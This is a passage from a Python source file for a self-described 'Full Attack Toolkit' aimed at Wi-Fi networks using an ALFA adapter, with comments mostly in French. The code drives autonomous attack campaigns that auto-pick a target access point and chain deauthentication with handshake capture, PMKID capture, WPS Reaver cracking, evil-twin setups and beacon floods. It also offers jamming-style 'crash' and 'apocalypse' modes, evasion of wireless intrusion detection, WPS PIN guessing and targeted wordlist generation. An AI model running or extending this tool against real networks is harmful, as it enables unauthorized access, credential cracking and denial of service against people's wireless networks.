    client = base / "airsnitch" / "research" / "client.py"
    if client.exists() and venv.exists():
        ok("AirSnitch already compiled")
        return True
    warn("AirSnitch found but not compiled. Running setup scripts...")
    ok(f"AirSnitch directory: {base}")
    setup = base / "setup.sh"
    build = base / "airsnitch" / "research" / "build.sh"
    pysetup = base / "airsnitch" / "research" / "pysetup.sh"
    if not setup.exists() or not build.exists() or not pysetup.exists():
        err("Some setup scripts are missing. Please compile manually:")
        print(f"  cd {base}")
        print("  ./setup.sh")
        print("  cd airsnitch/research")
        print("  ./build.sh")
        print("  ./pysetup.sh")
        return False
    print(f"\n  {C['Y']}Running: {setup}{C['N']}")
    run(f"cd {base} && ./setup.sh", live=True)
    print(f"  {C['Y']}Running: {build}{C['N']}")
    run(f"cd {base}/airsnitch/research && ./build.sh", live=True)
    print(f"  {C['Y']}Running: {pysetup}{C['N']}")
    run(f"cd {base}/airsnitch/research && ./pysetup.sh", live=True)
    if client.exists() and venv.exists():
        ok("AirSnitch compilation successful!")
        return True
    else:
        err("Compilation may have failed. Please compile manually.")
        return False

def run_airsnitch_test(test_type, ssid, psk, channel=None):
    if not airsnitch_available():
        warn("AirSnitch not ready. Attempting auto-setup...")
        if not airsnitch_auto_setup():
            err("AirSnitch setup failed. Please clone and compile manually.")
            return
    base = find_airsnitch()
    if not base:
        err("AirSnitch not found. Set AIRSNITCH_DIR or clone to ~/tools/airsnitch")
        return
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    if channel:
        set_channel(channel, iface)
    conf_content = f"""network={{
    ssid="{ssid}"
    psk="{psk}"
}}

network={{
    ssid="{ssid}"
    psk="{psk}"
}}
"""
    conf_path = base / "client.conf"
    with open(conf_path, "w") as f:
        f.write(conf_content)
    script = f"""#!/bin/bash
cd {base}
source venv/bin/activate
cd airsnitch/research
python3 client.py --test={test_type}
"""
    script_path = "/tmp/run_airsnitch.sh"
    with open(script_path, "w") as f:
        f.write(script)
    os.chmod(script_path, 0o755)
    header(f"AIRSNITCH — {test_type} on {ssid}")
    run(f"sudo {script_path}", live=True)
    os.remove(script_path)
    os.remove(conf_path)

# ═══════════════════════════════════════════════════════════════
# BRAIN COMMANDS
# ═══════════════════════════════════════════════════════════════

def _cmd_brain():
    if not brain:
        err("alfa_brain.py introuvable")
        return
    data = brain.load_brain()
    learned = brain.load_learned()
    header("ALFA BRAIN — ETAT")
    if not data and not learned:
        print("  Aucune donnee. Lancez --auto-brain pour apprendre.")
        return
    print(f"  Targets connus : {len(data)}")
    if data:
        for bssid, info in list(data.items())[:5]:
            print(f"    {bssid} -> {info}")
    print(f"  Strategies apprises : {len(learned)}")
    for bssid, attacks in learned.items():
        for atk, stats in attacks.items():
            rate = stats.get("wins", 0) / stats.get("n", 1)
            print(f"    {bssid} | {atk}: {rate:.0%} ({stats.get('n')} essais)")


def _cmd_auto_brain(intent="crack"):
    if not brain:
        err("alfa_brain.py introuvable")
        return
    header(f"AUTO-BRAIN — intent: {intent}")
    print("  [1] Scan + profilage")
    print("  [2] Campagne autonome (profil -> attaque -> crack)")
    try:
        sub = ask("Mode", "2")
    except EOFError:
        sub = "2"
    if sub == "1":
        scan_aps(band="abg", timeout=10)
        return
    try:
        bssid = ask("BSSID cible (ou Enter pour auto)", "")
    except EOFError:
        bssid = ""
    try:
        ch = ask("Canal (ou Enter pour auto)", "")
    except EOFError:
        ch = ""
    _run_campaign(intent, bssid if bssid else None, int(ch) if ch else None)


def _run_campaign(intent, bssid, channel):
    if not brain:
        err("alfa_brain.py introuvable")
        return
    if not bssid:
        warn("Aucune cible -> auto-target via scan")
        bssid, ch = auto_target()
        channel = channel or ch
    header(f"CAMPAIGN — {intent} on {bssid}")
    profile = None
    try:
        profiles = _last_scan_profiles()
        for p in profiles:
            if p.get("bssid") == bssid:
                profile = p
                break
    except Exception:
        pass
    if not profile:
        profile = {"bssid": bssid, "enc": "WPA2", "auth": "PSK", "channel": channel or 6, "clients": 1, "signal": -60, "wps_hint": True}
    attacks = profile.get("recommended_attacks", ["deauth+handshake"])
    print(f"  Cible: {profile.get('ssid')} [{bssid}] ch={profile.get('channel')}")
    print(f"  Faiblesses: {', '.join(profile.get('weaknesses', []))}")
    print(f"  Plan: {', '.join(attacks)}")
    for atk in attacks:
        print(f"\n  >> {atk}")
        success = _launch_attack(atk, profile)
        brain.record_result(bssid, atk, success, {"intent": intent})
        if success:
            ok(f"Attaque reussie: {atk}")
            return
        warn(f"Attaque échouée: {atk} — pivot")
    err("Toutes les attaques ont échoué pour cette cible.")


def _last_scan_profiles():
    try:
        r = run("ls -t /tmp/alfa_check-* 2>/dev/null | head -1", sudo=False)
        txt = ""
        if isinstance(r, str):
            txt = r.strip()
        elif hasattr(r, "stdout") and isinstance(getattr(r, "stdout", None), str):
            txt = r.stdout.strip()
        if not txt:
            return []
        if not brain:
            return []
        try:
            return brain.parse_airodump_csv(txt + "-01.csv")
        except Exception:
            return []
    except Exception:
        return []


def _launch_attack(attack, profile):
    bssid = profile.get("bssid")
    ch = profile.get("channel", 6)
    iface = choose_iface()
    try:
        if attack == "deauth+handshake":
            deauth(bssid, count=10, channel=ch)
            time.sleep(1)
            capture_handshake(bssid, ch)
            return True
        if attack == "pmkid":
            pmkid_capture(ch)
            return True
        if attack == "wps":
            wps_reaver(bssid, ch)
            return True
        if attack == "evil-twin-wpe":
            evil_twin_wpe(profile.get("ssid", "target"), ch)
            return True
        if attack in ("probe-flood", "beacon-flood"):
            beacon_flood(80, channels="1,6,11")
            return True
    except Exception as e:
        warn(f"Echec de {attack}: {e}")
    return False

# ═══════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="ALFA MANGER — AWUS036ACH Full Attack Toolkit",
        epilog="Examples:\n"
               "  sudo python3 alfa_mangler.py --apocalypse\n"
               "  sudo python3 alfa_mangler.py --pmkid-loop\n"
               "  sudo python3 alfa_mangler.py --crash auto -t ultimate"
    )
    parser.add_argument("--beast", nargs=2, metavar=("CHAN", "COUNT"),
                        help="Lance FLOOD BEAST avec canal et nombre de SSID")
    parser.add_argument("--crash", nargs=1, metavar=("CHAN"),
                        help="Lance CRASH BEAST sur un canal, ou 'auto' pour auto‑target")
    parser.add_argument("-t", "--type", choices=["auth","deauth","eapol","beam","ultimate","jammer"],
                        default="auth", help="Type d'attaque pour CRASH BEAST")
    parser.add_argument("-b", "--bssid", help="BSSID cible pour CRASH BEAST (optionnel)")
    parser.add_argument("--multiplier", type=int, help="Nombre de processus pour multiplier (ex: 50)")
    parser.add_argument("--apocalypse", nargs='?', const="auto", help="Lance l'Apocalypse Engine")
    parser.add_argument("--pmkid-loop", nargs='?', const="auto", help="Lance la boucle PMKID")
    parser.add_argument("--ssid-file", help="Fichier contenant les SSID (un par ligne)")
    parser.add_argument("--ssid-list", help="Liste de SSID separes par des virgules")
    parser.add_argument("--tune", action="store_true", help="Auto-tune adapter for MAX performance")
    parser.add_argument("--txpower", type=int, metavar="DBM", help="Set TX power (0-30 dBm)")
    parser.add_argument("--inj-rate", type=int, metavar="PPS", help="Aireplay injection rate (pps)")
    parser.add_argument("--mdk-speed", nargs=2, metavar=("PROCS", "CHAN"), help="MDK4 speed tune")
    parser.add_argument("--show-perf", action="store_true", help="Show performance status")
    parser.add_argument("--brain", action="store_true", help="Show learned strategies / brain state")
    parser.add_argument("--auto-brain", nargs='?', const="crack", help="Autonomous campaign: intent (crack/scan/pmkid/wps)")
    parser.add_argument("--wids", action="store_true", help="Check for WIDS before attack and adapt evasion")
    parser.add_argument("--pin-guess", help="Guess WPS PIN candidates for BSSID or SSID")
    parser.add_argument("--dict-gen", nargs='?', const="", help="Generate targeted wordlist from ESSID/BSSID [+ optional base file]")
    parser.add_argument("--nl", help="Natural language command (FR/EN)")

    args = parser.parse_args()

    check_root()
    _arm_killer()

    did_something = False

    def _mark():
        nonlocal did_something
        did_something = True

    if args.tune:
        _mark()
        tune_adapter()
    if args.show_perf:
        _mark()
        show_perf()
    if args.txpower is not None:
        _mark()
        boost_txpower(args.txpower)
    if args.inj_rate is not None:
        _mark()
        set_injection_rate(args.inj_rate)
    if args.mdk_speed:
        _mark()
        tune_mdk4_speed(procs=int(args.mdk_speed[0]), channel=int(args.mdk_speed[1]))
    if args.brain:
        _mark()
        _cmd_brain()
    if args.auto_brain:
        if not brain:
            err("alfa_brain.py introuvable")
            sys.exit(1)
        _mark()
        _cmd_auto_brain(args.auto_brain)
    if args.wids:
        if not brain:
            err("alfa_brain.py introuvable")
            sys.exit(1)
        _mark()
        score = brain.detect_wids()
        params = brain.evasion_params(score)
        ok(f"WIDS score: {score:.2f} -> {params}")
    if args.pin_guess:
        if not brain:
            err("alfa_brain.py introuvable")
            sys.exit(1)
        _mark()
        print("\n".join(brain.wps_pin_candidates(essid=args.pin_guess, bssid=args.pin_guess)))
    if args.dict_gen is not None:
        if not brain:
            err("alfa_brain.py introuvable")
            sys.exit(1)
        _mark()
        out = Path.home() / ".cache" / "nyvyrx_ss_lsof" / "brain" / "targeted_dict.txt"
        words = brain.targeted_dict()
        out.write_text("\n".join(words))
        ok(f"Wrote {len(words)} words to {out}")
    if args.nl:
        if not brain:
            err("alfa_brain.py introuvable")
            sys.exit(1)
        _mark()
        parsed = brain.parse_nl(args.nl)
        print(parsed)

    if args.beast:
        channel = int(args.beast[0])
        count = int(args.beast[1])
        if args.ssid_file:
            if os.path.exists(args.ssid_file):
                flood_beast(channel, count, ssid_file=args.ssid_file)
            else:
                err(f"Fichier introuvable : {args.ssid_file}")
        elif args.ssid_list:
            ssid_list = [s.strip() for s in args.ssid_list.split(',') if s.strip()]
            flood_beast(channel, count, ssid_list=ssid_list)
        else:
            flood_beast(channel, count)
    elif args.crash:
        chan_arg = args.crash[0]
        if chan_arg.lower() == "auto":
            crash_beast(6, None, args.type, auto=True)
        else:
            channel = int(chan_arg)
            if args.multiplier:
                multiplier_attack(channel, args.bssid, args.type, args.multiplier)
            else:
                crash_beast(channel, args.bssid, args.type, auto=False)
    elif args.apocalypse:
        if args.apocalypse == "auto":
            apocalypse_mode(None, None)
        else:
            apocalypse_mode(args.apocalypse, None)
    elif args.pmkid_loop:
        if args.pmkid_loop == "auto":
            pmkid_capture_loop(None)
        else:
            try:
                ch = int(args.pmkid_loop)
                pmkid_capture_loop(ch)
            except ValueError:
                pmkid_capture_loop(None)
    elif did_something:
        pass
    else:
        interactive_menu()

if __name__ == "__main__":
    main()